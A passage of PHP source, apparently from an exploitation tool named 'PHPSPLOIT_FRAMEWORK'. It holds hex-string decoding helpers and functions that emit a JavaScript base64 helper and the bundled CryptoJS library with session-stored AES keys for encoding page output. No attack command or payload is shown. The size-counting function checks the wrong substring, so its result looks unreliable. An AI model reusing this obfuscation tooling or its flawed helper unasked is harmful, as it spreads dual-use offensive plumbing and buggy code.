        if ( is_string ( $format_bin2_content ) ) {
            $_bin2_content               = "";
            $_format_bin2_content_length = strlen ( $format_bin2_content );
            for ( $index = 0 ; $index < $_format_bin2_content_length ; $index += 4 ) {
                $_hex = substr ( $format_bin2_content , $index , 4 );
                if ( strlen ( $_hex ) == 4 ) {
                    $_hex_0_2 = substr ( $_hex , 0 , 2 );
                    $_hex_2_4 = substr ( $_hex , 2 , 2 );
                    if ( $_hex_0_2 == '\x' ) {
                        if ( Class_Base_Format ::is_minlen_to_maxlen_hex ( $_hex_2_4 , 2 , 2 ) ) {
                            $_char         = chr ( hexdec ( $_hex_2_4 ) );
                            $_bin2_content .= $_char;
                        }
                    }
                }
            }
            return $_bin2_content;
        }
        return false;
    }

    public static function get_format_bin2_string_size ( $format_bin2_content )
    {
        if ( is_string ( $format_bin2_content ) ) {
            $_format_bin2_content_size = 0;
            $_string_length            = strlen ( $format_bin2_content );
            for ( $index = 0 ; $index < $_string_length ; $index += 4 ) {
                $_hex = substr ( $format_bin2_content , $index , 4 );
                if ( strlen ( $_hex ) == 4 ) {
                    if ( substr ( $format_bin2_content , 0 , 2 ) == "\x" ) {
                        if ( Class_Base_Format ::is_minlen_to_maxlen_hex ( substr ( $format_bin2_content , 2 , 2 ) , 2 , 2 ) ) {
                            $_format_bin2_content_size ++;
                        }
                    }
                }
            }
            return $_format_bin2_content_size;
        }
        return false;
    }

    public static function get_js_base64_source_code ()
    {
        $_source_code = '<script type="text/javascript">';
        $_source_code .= 'function base64_encode( str ){';
        $_source_code .= '    if (window.btoa){';
        $_source_code .= '        return window.btoa(unescape(encodeURIComponent( str )));';
        $_source_code .= '    }else{';
        $_source_code .= '        var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}};';
        $_source_code .= '        return Base64.encode(unescape(encodeURIComponent( str )));';
        $_source_code .= '    }';
        $_source_code .= '}';
        $_source_code .= 'function base64_decode( str ){';
        $_source_code .= '    if (window.atob){';
        $_source_code .= '        return decodeURIComponent(escape(window.atob( str )));';
        $_source_code .= '    }else{';
        $_source_code .= '        var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}};';
        $_source_code .= '        return decodeURIComponent(escape(Base64.decode( str )));';
        $_source_code .= '    }';
        $_source_code .= '}';
        $_source_code .= '</script>';
        return $_source_code;
    }

    public static function get_js_encode_source_code ()
    {
        $_rand_key    = $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] = ( time () . rand ( 100000 , 999999 ) );
        $_rand_iv     = $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] = base64_encode ( openssl_random_pseudo_bytes ( openssl_cipher_iv_length ( "AES-256-CBC" ) ) );
        $_source_code = '<script type="text/javascript"> /* [The MIT License (MIT)](http://opensource.org/licenses/MIT) Copyright (c) 2009-2013 Jeff Mott Copyright (c) 2013-2016 Evan Vosberg */ !function(t,e){"object"==typeof exports?module.exports=exports=e():"function"==typeof define&&define.amd?define([],e):t.CryptoJS=e()}(this,function(){var n,o,s,a,h,t,e,l,r,i,c,f,d,u,p,S,x,b,A,H,z,_,v,g,y,B,w,k,m,C,D,E,R,M,F,P,W,O,I,U=U||function(h){var i;if("undefined"!=typeof window&&window.crypto&&(i=window.crypto),"undefined"!=typeof self&&self.crypto&&(i=self.crypto),!(i=!(i=!(i="undefined"!=typeof globalThis&&globalThis.crypto?globalThis.crypto:i)&&"undefined"!=typeof window&&window.msCrypto?window.msCrypto:i)&&"undefined"!=typeof global&&global.crypto?global.crypto:i)&&"function"==typeof require)try{i=require("crypto")}catch(t){}var r=Object.create||function(t){return e.prototype=t,t=new e,e.prototype=null,t};function e(){}var t={},n=t.lib={},o=n.Base={extend:function(t){var e=r(this);return t&&e.mixIn(t),e.hasOwnProperty("init")&&this.init!==e.init||(e.init=function(){e.$super.init.apply(this,arguments)}),(e.init.prototype=e).$super=this,e},create:function(){var t=this.extend();return t.init.apply(t,arguments),t},init:function(){},mixIn:function(t){for(var e in t)t.hasOwnProperty(e)&&(this[e]=t[e]);t.hasOwnProperty("toString")&&(this.toString=t.toString)},clone:function(){return this.init.prototype.extend(this)}},l=n.WordArray=o.extend({init:function(t,e){t=this.words=t||[],this.sigBytes=null!=e?e:4*t.length},toString:function(t){return(t||c).stringify(this)},concat:function(t){var e=this.words,r=t.words,i=this.sigBytes,n=t.sigBytes;if(this.clamp(),i%4)for(var o=0;o<n;o++){var s=r[o>>>2]>>>24-o%4*8&255;e[i+o>>>2]|=s<<24-(i+o)%4*8}else for(var c=0;c<n;c+=4)e[i+c>>>2]=r[c>>>2];return this.sigBytes+=n,this},clamp:function(){var t=this.words,e=this.sigBytes;t[e>>>2]&=4294967295<<32-e%4*8,t.length=h.ceil(e/4)},clone:function(){var t=o.clone.call(this);return t.words=this.words.slice(0),t},random:function(t){for(var e=[],r=0;r<t;r+=4)e.push(function(){if(i){if("function"==typeof i.getRandomValues)try{return i.getRandomValues(new Uint32Array(1))[0]}catch(t){}if("function"==typeof i.randomBytes)try{return i.randomBytes(4).readInt32LE()}catch(t){}}throw new Error("Native crypto module could not be used to get secure random number.")}());return new l.init(e,t)}}),s=t.enc={},c=s.Hex={stringify:function(t){for(var e=t.words,r=t.sigBytes,i=[],n=0;n<r;n++){var o=e[n>>>2]>>>24-n%4*8&255;i.push((o>>>4).toString(16)),i.push((15&o).toString(16))}return i.join("")},parse:function(t){for(var e=t.length,r=[],i=0;i<e;i+=2)r[i>>>3]|=parseInt(t.substr(i,2),16)<<24-i%8*4;return new l.init(r,e/2)}},a=s.Latin1={stringify:function(t){for(var e=t.words,r=t.sigBytes,i=[],n=0;n<r;n++){var o=e[n>>>2]>>>24-n%4*8&255;i.push(String.fromCharCode(o))}return i.join("")},parse:function(t){for(var e=t.length,r=[],i=0;i<e;i++)r[i>>>2]|=(255&t.charCodeAt(i))<<24-i%4*8;return new l.init(r,e)}},f=s.Utf8={stringify:function(t){try{return decodeURIComponent(escape(a.stringify(t)))}catch(t){throw new Error("Malformed UTF-8 data")}},parse:function(t){return a.parse(unescape(encodeURIComponent(t)))}},d=n.BufferedBlockAlgorithm=o.extend({reset:function(){this._data=new l.init,this._nDataBytes=0},_append:function(t){"string"==typeof t&&(t=f.parse(t)),this._data.concat(t),this._nDataBytes+=t.sigBytes},_process:function(t){var e,r=this._data,i=r.words,n=r.sigBytes,o=this.blockSize,s=n/(4*o),c=(s=t?h.ceil(s):h.max((0|s)-this._minBufferSize,0))*o,n=h.min(4*c,n);if(c){for(var a=0;a<c;a+=o)this._doProcessBlock(i,a);e=i.splice(0,c),r.sigBytes-=n}return new l.init(e,n)},clone:function(){var t=o.clone.call(this);return t._data=this._data.clone(),t},_minBufferSize:0}),u=(n.Hasher=d.extend({cfg:o.extend(),init:function(t){this.cfg=this.cfg.extend(t),this.reset()},reset:function(){d.reset.call(this),this._doReset()},update:function(t){return this._append(t),this._process(),this},finalize:function(t){return t&&this._append(t),this._doFinalize()},blockSize:16,_createHelper:function(r){return function(t,e){return new r.init(e).finalize(t)}},_createHmacHelper:function(r){return function(t,e){return new u.HMAC.init(r,e).finalize(t)}}}),t.algo={});return t}(Math);function K(t,e,r){return t&e|~t&r}function X(t,e,r){return t&r|e&~r}function L(t,e){return t<<e|t>>>32-e}function j(t,e,r,i){var n,o=this._iv;o?(n=o.slice(0),this._iv=void 0):n=this._prevBlock,i.encryptBlock(n,0);for(var s=0;s<r;s++)t[e+s]^=n[s]}function T(t){var e,r,i;return 255==(t>>24&255)?(r=t>>8&255,i=255&t,255===(e=t>>16&255)?(e=0,255===r?(r=0,255===i?i=0:++i):++r):++e,t=0,t+=e<<16,t+=r<<8,t+=i):t+=1<<24,t}function N(){for(var t=this._X,e=this._C,r=0;r<8;r++)E[r]=e[r];e[0]=e[0]+1295307597+this._b|0,e[1]=e[1]+3545052371+(e[0]>>>0<E[0]>>>0?1:0)|0,e[2]=e[2]+886263092+(e[1]>>>0<E[1]>>>0?1:0)|0,e[3]=e[3]+1295307597+(e[2]>>>0<E[2]>>>0?1:0)|0,e[4]=e[4]+3545052371+(e[3]>>>0<E[3]>>>0?1:0)|0,e[5]=e[5]+886263092+(e[4]>>>0<E[4]>>>0?1:0)|0,e[6]=e[6]+1295307597+(e[5]>>>0<E[5]>>>0?1:0)|0,e[7]=e[7]+3545052371+(e[6]>>>0<E[6]>>>0?1:0)|0,this._b=e[7]>>>0<E[7]>>>0?1:0;for(r=0;r<8;r++){var i=t[r]+e[r],n=65535&i,o=i>>>16;R[r]=((n*n>>>17)+n*o>>>15)+o*o^((4294901760&i)*i|0)+((65535&i)*i|0)}t[0]=R[0]+(R[7]<<16|R[7]>>>16)+(R[6]<<16|R[6]>>>16)|0,t[1]=R[1]+(R[0]<<8|R[0]>>>24)+R[7]|0,t[2]=R[2]+(R[1]<<16|R[1]>>>16)+(R[0]<<16|R[0]>>>16)|0,t[3]=R[3]+(R[2]<<8|R[2]>>>24)+R[1]|0,t[4]=R[4]+(R[3]<<16|R[3]>>>16)+(R[2]<<16|R[2]>>>16)|0,t[5]=R[5]+(R[4]<<8|R[4]>>>24)+R[3]|0,t[6]=R[6]+(R[5]<<16|R[5]>>>16)+(R[4]<<16|R[4]>>>16)|0,t[7]=R[7]+(R[6]<<8|R[6]>>>24)+R[5]|0}function q(){for(var t=this._X,e=this._C,r=0;r<8;r++)O[r]=e[r];e[0]=e[0]+1295307597+this._b|0,e[1]=e[1]+3545052371+(e[0]>>>0<O[0]>>>0?1:0)|0,e[2]=e[2]+886263092+(e[1]>>>0<O[1]>>>0?1:0)|0,e[3]=e[3]+1295307597+(e[2]>>>0<O[2]>>>0?1:0)|0,e[4]=e[4]+3545052371+(e[3]>>>0<O[3]>>>0?1:0)|0,e[5]=e[5]+886263092+(e[4]>>>0<O[4]>>>0?1:0)|0,e[6]=e[6]+1295307597+(e[5]>>>0<O[5]>>>0?1:0)|0,e[7]=e[7]+3545052371+(e[6]>>>0<O[6]>>>0?1:0)|0,this._b=e[7]>>>0<O[7]>>>0?1:0;for(r=0;r<8;r++){var i=t[r]+e[r],n=65535&i,o=i>>>16;I[r]=((n*n>>>17)+n*o>>>15)+o*o^((4294901760&i)*i|0)+((65535&i)*i|0)}t[0]=I[0]+(I[7]<<16|I[7]>>>16)+(I[6]<<16|I[6]>>>16)|0,t[1]=I[1]+(I[0]<<8|I[0]>>>24)+I[7]|0,t[2]=I[2]+(I[1]<<16|I[1]>>>16)+(I[0]<<16|I[0]>>>16)|0,t[3]=I[3]+(I[2]<<8|I[2]>>>24)+I[1]|0,t[4]=I[4]+(I[3]<<16|I[3]>>>16)+(I[2]<<16|I[2]>>>16)|0,t[5]=I[5]+(I[4]<<8|I[4]>>>24)+I[3]|0,t[6]=I[6]+(I[5]<<16|I[5]>>>16)+(I[4]<<16|I[4]>>>16)|0,t[7]=I[7]+(I[6]<<8|I[6]>>>24)+I[5]|0}return F=(M=U).lib,n=F.Base,o=F.WordArray,(M=M.x64={}).Word=n.extend({init:function(t,e){this.high=t,this.low=e}}),M.WordArray=n.extend({init:function(t,e){t=this.words=t||[],this.sigBytes=null!=e?e:8*t.length},toX32:function(){for(var t=this.words,e=t.length,r=[],i=0;i<e;i++){var n=t[i];r.push(n.high),r.push(n.low)}return o.create(r,this.sigBytes)},clone:function(){for(var t=n.clone.call(this),e=t.words=this.words.slice(0),r=e.length,i=0;i<r;i++)e[i]=e[i].clone();return t}}),"function"==typeof ArrayBuffer&&(P=U.lib.WordArray,s=P.init,(P.init=function(t){if((t=(t=t instanceof ArrayBuffer?new Uint8Array(t):t)instanceof Int8Array||"undefined"!=typeof Uint8ClampedArray&&t instanceof Uint8ClampedArray||t instanceof Int16Array||t instanceof Uint16Array||t instanceof Int32Array||t instanceof Uint32Array||t instanceof Float32Array||t instanceof Float64Array?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t)instanceof Uint8Array){for(var e=t.byteLength,r=[],i=0;i<e;i++)r[i>>>2]|=t[i]<<24-i%4*8;s.call(this,r,e)}else s.apply(this,arguments)}).prototype=P),function(){var t=U,n=t.lib.WordArray,t=t.enc;t.Utf16=t.Utf16BE={stringify:function(t){for(var e=t.words,r=t.sigBytes,i=[],n=0;n<r;n+=2){var o=e[n>>>2]>>>16-n%4*8&65535;i.push(String.fromCharCode(o))}return i.join("")},parse:function(t){for(var e=t.length,r=[],i=0;i<e;i++)r[i>>>1]|=t.charCodeAt(i)<<16-i%2*16;return n.create(r,2*e)}};function s(t){return t<<8&4278255360|t>>>8&16711935}t.Utf16LE={stringify:function(t){for(var e=t.words,r=t.sigBytes,i=[],n=0;n<r;n+=2){var o=s(e[n>>>2]>>>16-n%4*8&65535);i.push(String.fromCharCode(o))}return i.join("")},parse:function(t){for(var e=t.length,r=[],i=0;i<e;i++)r[i>>>1]|=s(t.charCodeAt(i)<<16-i%2*16);return n.create(r,2*e)}}}(),a=(w=U).lib.WordArray,w.enc.Base64={stringify:function(t){var e=t.words,r=t.sigBytes,i=this._map;t.clamp();for(var n=[],o=0;o<r;o+=3)for(var s=(e[o>>>2]>>>24-o%4*8&255)<<16|(e[o+1>>>2]>>>24-(o+1)%4*8&255)<<8|e[o+2>>>2]>>>24-(o+2)%4*8&255,c=0;c<4&&o+.75*c<r;c++)n.push(i.charAt(s>>>6*(3-c)&63));var a=i.charAt(64);if(a)for(;n.length%4;)n.push(a);return n.join("")},parse:function(t){var e=t.length,r=this._map;if(!(i=this._reverseMap))for(var i=this._reverseMap=[],n=0;n<r.length;n++)i[r.charCodeAt(n)]=n;var o=r.charAt(64);return!o||-1!==(o=t.indexOf(o))&&(e=o),function(t,e,r){for(var i=[],n=0,o=0;o<e;o++){var s,c;o%4&&(s=r[t.charCodeAt(o-1)]<<o%4*2,c=r[t.charCodeAt(o)]>>>6-o%4*2,c=s|c,i[n>>>2]|=c<<24-n%4*8,n++)}return a.create(i,n)}(t,e,i)},_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="},h=(F=U).lib.WordArray,F.enc.Base64url={stringify:function(t,e=!0){var r=t.words,i=t.sigBytes,n=e?this._safe_map:this._map;t.clamp();for(var o=[],s=0;s<i;s+=3)for(var c=(r[s>>>2]>>>24-s%4*8&255)<<16|(r[s+1>>>2]>>>24-(s+1)%4*8&255)<<8|r[s+2>>>2]>>>24-(s+2)%4*8&255,a=0;a<4&&s+.75*a<i;a++)o.push(n.charAt(c>>>6*(3-a)&63));var h=n.charAt(64);if(h)for(;o.length%4;)o.push(h);return o.join("")},parse:function(t,e=!0){var r=t.length,i=e?this._safe_map:this._map;if(!(n=this._reverseMap))for(var n=this._reverseMap=[],o=0;o<i.length;o++)n[i.charCodeAt(o)]=o;e=i.charAt(64);return!e||-1!==(e=t.indexOf(e))&&(r=e),function(t,e,r){for(var i=[],n=0,o=0;o<e;o++){var s,c;o%4&&(s=r[t.charCodeAt(o-1)]<<o%4*2,c=r[t.charCodeAt(o)]>>>6-o%4*2,c=s|c,i[n>>>2]|=c<<24-n%4*8,n++)}return h.create(i,n)}(t,r,n)},_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",_safe_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"},function(a){var t=U,e=t.lib,r=e.WordArray,i=e.Hasher,e=t.algo,A=[];!function(){for(var t=0;t<64;t++)A[t]=4294967296*a.abs(a.sin(t+1))|0}();e=e.MD5=i.extend({_doReset:function(){this._hash=new r.init([1732584193,4023233417,2562383102,271733878])},_doProcessBlock:function(t,e){for(var r=0;r<16;r++){var i=e+r,n=t[i];t[i]=16711935&(n<<8|n>>>24)|4278255360&(n<<24|n>>>8)}var o=this._hash.words,s=t[e+0],c=t[e+1],a=t[e+2],h=t[e+3],l=t[e+4],f=t[e+5],d=t[e+6],u=t[e+7],p=t[e+8],_=t[e+9],y=t[e+10],v=t[e+11],g=t[e+12],B=t[e+13],w=t[e+14],k=t[e+15],m=H(m=o[0],b=o[1],x=o[2],S=o[3],s,7,A[0]),S=H(S,m,b,x,c,12,A[1]),x=H(x,S,m,b,a,17,A[2]),b=H(b,x,S,m,h,22,A[3]);m=H(m,b,x,S,l,7,A[4]),S=H(S,m,b,x,f,12,A[5]),x=H(x,S,m,b,d,17,A[6]),b=H(b,x,S,m,u,22,A[7]),m=H(m,b,x,S,p,7,A[8]),S=H(S,m,b,x,_,12,A[9]),x=H(x,S,m,b,y,17,A[10]),b=H(b,x,S,m,v,22,A[11]),m=H(m,b,x,S,g,7,A[12]),S=H(S,m,b,x,B,12,A[13]),x=H(x,S,m,b,w,17,A[14]),m=z(m,b=H(b,x,S,m,k,22,A[15]),x,S,c,5,A[16]),S=z(S,m,b,x,d,9,A[17]),x=z(x,S,m,b,v,14,A[18]),b=z(b,x,S,m,s,20,A[19]),m=z(m,b,x,S,f,5,A[20]),S=z(S,m,b,x,y,9,A[21]),x=z(x,S,m,b,k,14,A[22]),b=z(b,x,S,m,l,20,A[23]),m=z(m,b,x,S,_,5,A[24]),S=z(S,m,b,x,w,9,A[25]),x=z(x,S,m,b,h,14,A[26]),b=z(b,x,S,m,p,20,A[27]),m=z(m,b,x,S,B,5,A[28]),S=z(S,m,b,x,a,9,A[29]),x=z(x,S,m,b,u,14,A[30]),m=C(m,b=z(b,x,S,m,g,20,A[31]),x,S,f,4,A[32]),S=C(S,m,b,x,p,11,A[33]),x=C(x,S,m,b,v,16,A[34]),b=C(b,x,S,m,w,23,A[35]),m=C(m,b,x,S,c,4,A[36]),S=C(S,m,b,x,l,11,A[37]),x=C(x,S,m,b,u,16,A[38]),b=C(b,x,S,m,y,23,A[39]),m=C(m,b,x,S,B,4,A[40]),S=C(S,m,b,x,s,11,A[41]),x=C(x,S,m,b,h,16,A[42]),b=C(b,x,S,m,d,23,A[43]),m=C(m,b,x,S,_,4,A[44]),S=C(S,m,b,x,g,11,A[45]),x=C(x,S,m,b,k,16,A[46]),m=D(m,b=C(b,x,S,m,a,23,A[47]),x,S,s,6,A[48]),S=D(S,m,b,x,u,10,A[49]),x=D(x,S,m,b,w,15,A[50]),b=D(b,x,S,m,f,21,A[51]),m=D(m,b,x,S,g,6,A[52]),S=D(S,m,b,x,h,10,A[53]),x=D(x,S,m,b,y,15,A[54]),b=D(b,x,S,m,c,21,A[55]),m=D(m,b,x,S,p,6,A[56]),S=D(S,m,b,x,k,10,A[57]),x=D(x,S,m,b,d,15,A[58]),b=D(b,x,S,m,B,21,A[59]),m=D(m,b,x,S,l,6,A[60]),S=D(S,m,b,x,v,10,A[61]),x=D(x,S,m,b,a,15,A[62]),b=D(b,x,S,m,_,21,A[63]),o[0]=o[0]+m|0,o[1]=o[1]+b|0,o[2]=o[2]+x|0,o[3]=o[3]+S|0},_doFinalize:function(){var t=this._data,e=t.words,r=8*this._nDataBytes,i=8*t.sigBytes;e[i>>>5]|=128<<24-i%32;var n=a.floor(r/4294967296),r=r;e[15+(64+i>>>9<<4)]=16711935&(n<<8|n>>>24)|4278255360&(n<<24|n>>>8),e[14+(64+i>>>9<<4)]=16711935&(r<<8|r>>>24)|4278255360&(r<<24|r>>>8),t.sigBytes=4*(e.length+1),this._process();for(var e=this._hash,o=e.words,s=0;s<4;s++){var c=o[s];o[s]=16711935&(c<<8|c>>>24)|4278255360&(c<<24|c>>>8)}return e},clone:function(){var t=i.clone.call(this);return t._hash=this._hash.clone(),t}});function H(t,e,r,i,n,o,s){s=t+(e&r|~e&i)+n+s;return(s<<o|s>>>32-o)+e}function z(t,e,r,i,n,o,s){s=t+(e&i|r&~i)+n+s;return(s<<o|s>>>32-o)+e}function C(t,e,r,i,n,o,s){s=t+(e^r^i)+n+s;return(s<<o|s>>>32-o)+e}function D(t,e,r,i,n,o,s){s=t+(r^(e|~i))+n+s;return(s<<o|s>>>32-o)+e}t.MD5=i._createHelper(e),t.HmacMD5=i._createHmacHelper(e)}(Math),P=(M=U).lib,t=P.WordArray,e=P.Hasher,P=M.algo,l=[],P=P.SHA1=e.extend({_doReset:function(){this._hash=new t.init([1732584193,4023233417,2562383102,271733878,3285377520])},_doProcessBlock:function(t,e){for(var r=this._hash.words,i=r[0],n=r[1],o=r[2],s=r[3],c=r[4],a=0;a<80;a++){a<16?l[a]=0|t[e+a]:(h=l[a-3]^l[a-8]^l[a-14]^l[a-16],l[a]=h<<1|h>>>31);var h=(i<<5|i>>>27)+c+l[a];h+=a<20?1518500249+(n&o|~n&s):a<40?1859775393+(n^o^s):a<60?(n&o|n&s|o&s)-1894007588:(n^o^s)-899497514,c=s,s=o,o=n<<30|n>>>2,n=i,i=h}r[0]=r[0]+i|0,r[1]=r[1]+n|0,r[2]=r[2]+o|0,r[3]=r[3]+s|0,r[4]=r[4]+c|0},_doFinalize:function(){var t=this._data,e=t.words,r=8*this._nDataBytes,i=8*t.sigBytes;return e[i>>>5]|=128<<24-i%32,e[14+(64+i>>>9<<4)]=Math.floor(r/4294967296),e[15+(64+i>>>9<<4)]=r,t.sigBytes=4*e.length,this._process(),this._hash},clone:function(){var t=e.clone.call(this);return t._hash=this._hash.clone(),t}}),M.SHA1=e._createHelper(P),M.HmacSHA1=e._createHmacHelper(P),function(n){var t=U,e=t.lib,r=e.WordArray,i=e.Hasher,e=t.algo,o=[],p=[];!function(){function t(t){return 4294967296*(t-(0|t))|0}for(var e=2,r=0;r<64;)!function(t){for(var e=n.sqrt(t),r=2;r<=e;r++)if(!(t%r))return;return 1}(e)||(r<8&&(o[r]=t(n.pow(e,.5))),p[r]=t(n.pow(e,1/3)),r++),e++}();var _=[],e=e.SHA256=i.extend({_doReset:function(){this._hash=new r.init(o.slice(0))},_doProcessBlock:function(t,e){for(var r=this._hash.words,i=r[0],n=r[1],o=r[2],s=r[3],c=r[4],a=r[5],h=r[6],l=r[7],f=0;f<64;f++){f<16?_[f]=0|t[e+f]:(d=_[f-15],u=_[f-2],_[f]=((d<<25|d>>>7)^(d<<14|d>>>18)^d>>>3)+_[f-7]+((u<<15|u>>>17)^(u<<13|u>>>19)^u>>>10)+_[f-16]);var d=i&n^i&o^n&o,u=l+((c<<26|c>>>6)^(c<<21|c>>>11)^(c<<7|c>>>25))+(c&a^~c&h)+p[f]+_[f],l=h,h=a,a=c,c=s+u|0,s=o,o=n,n=i,i=u+(((i<<30|i>>>2)^(i<<19|i>>>13)^(i<<10|i>>>22))+d)|0}r[0]=r[0]+i|0,r[1]=r[1]+n|0,r[2]=r[2]+o|0,r[3]=r[3]+s|0,r[4]=r[4]+c|0,r[5]=r[5]+a|0,r[6]=r[6]+h|0,r[7]=r[7]+l|0},_doFinalize:function(){var t=this._data,e=t.words,r=8*this._nDataBytes,i=8*t.sigBytes;return e[i>>>5]|=128<<24-i%32,e[14+(64+i>>>9<<4)]=n.floor(r/4294967296),e[15+(64+i>>>9<<4)]=r,t.sigBytes=4*e.length,this._process(),this._hash},clone:function(){var t=i.clone.call(this);return t._hash=this._hash.clone(),t}});t.SHA256=i._createHelper(e),t.HmacSHA256=i._createHmacHelper(e)}(Math),r=(w=U).lib.WordArray,F=w.algo,i=F.SHA256,F=F.SHA224=i.extend({_doReset:function(){this._hash=new r.init([3238371032,914150663,812702999,4144912697,4290775857,1750603025,1694076839,3204075428])},_doFinalize:function(){var t=i._doFinalize.call(this);return t.sigBytes-=4,t}}),w.SHA224=i._createHelper(F),w.HmacSHA224=i._createHmacHelper(F),function(){var t=U,e=t.lib.Hasher,r=t.x64,i=r.Word,n=r.WordArray,r=t.algo;function o(){return i.create.apply(i,arguments)}var t1=[o(1116352408,3609767458),o(1899447441,602891725),o(3049323471,3964484399),o(3921009573,2173295548),o(961987163,4081628472),o(1508970993,3053834265),o(2453635748,2937671579),o(2870763221,3664609560),o(3624381080,2734883394),o(310598401,1164996542),o(607225278,1323610764),o(1426881987,3590304994),o(1925078388,4068182383),o(2162078206,991336113),o(2614888103,633803317),o(3248222580,3479774868),o(3835390401,2666613458),o(4022224774,944711139),o(264347078,2341262773),o(604807628,2007800933),o(770255983,1495990901),o(1249150122,1856431235),o(1555081692,3175218132),o(1996064986,2198950837),o(2554220882,3999719339),o(2821834349,766784016),o(2952996808,2566594879),o(3210313671,3203337956),o(3336571891,1034457026),o(3584528711,2466948901),o(113926993,3758326383),o(338241895,168717936),o(666307205,1188179964),o(773529912,1546045734),o(1294757372,1522805485),o(1396182291,2643833823),o(1695183700,2343527390),o(1986661051,1014477480),o(2177026350,1206759142),o(2456956037,344077627),o(2730485921,1290863460),o(2820302411,3158454273),o(3259730800,3505952657),o(3345764771,106217008),o(3516065817,3606008344),o(3600352804,1432725776),o(4094571909,1467031594),o(275423344,851169720),o(430227734,3100823752),o(506948616,1363258195),o(659060556,3750685593),o(883997877,3785050280),o(958139571,3318307427),o(1322822218,3812723403),o(1537002063,2003034995),o(1747873779,3602036899),o(1955562222,1575990012),o(2024104815,1125592928),o(2227730452,2716904306),o(2361852424,442776044),o(2428436474,593698344),o(2756734187,3733110249),o(3204031479,2999351573),o(3329325298,3815920427),o(3391569614,3928383900),o(3515267271,566280711),o(3940187606,3454069534),o(4118630271,4000239992),o(116418474,1914138554),o(174292421,2731055270),o(289380356,3203993006),o(460393269,320620315),o(685471733,587496836),o(852142971,1086792851),o(1017036298,365543100),o(1126000580,2618297676),o(1288033470,3409855158),o(1501505948,4234509866),o(1607167915,987167468),o(1816402316,1246189591)],e1=[];!function(){for(var t=0;t<80;t++)e1[t]=o()}();r=r.SHA512=e.extend({_doReset:function(){this._hash=new n.init([new i.init(1779033703,4089235720),new i.init(3144134277,2227873595),new i.init(1013904242,4271175723),new i.init(2773480762,1595750129),new i.init(1359893119,2917565137),new i.init(2600822924,725511199),new i.init(528734635,4215389547),new i.init(1541459225,327033209)])},_doProcessBlock:function(t,e){for(var 